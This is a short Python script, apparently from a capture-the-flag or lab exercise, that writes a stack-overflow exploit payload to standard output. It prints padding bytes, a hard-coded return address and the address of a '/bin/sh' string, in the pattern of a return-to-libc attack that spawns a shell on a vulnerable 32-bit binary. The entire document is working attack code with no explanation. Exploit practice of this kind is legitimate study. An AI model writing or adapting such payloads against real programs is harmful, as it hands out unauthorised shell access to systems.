import sys
blanks = b"\11" * 22
sys.stdout.buffer.write(blanks)
bin_sh = (0x80b0bcc).to_bytes(4, 'little')
#sys.stdout.buffer.write(bin_sh)
return_addr = (0x804fef0).to_bytes(4, 'little')
# return_addr = b"\xf0\xfe\x04\x08"
sys.stdout.buffer.write(return_addr)
sys.stdout.buffer.write(b"\11" * 4)
sys.stdout.buffer.write(bin_sh)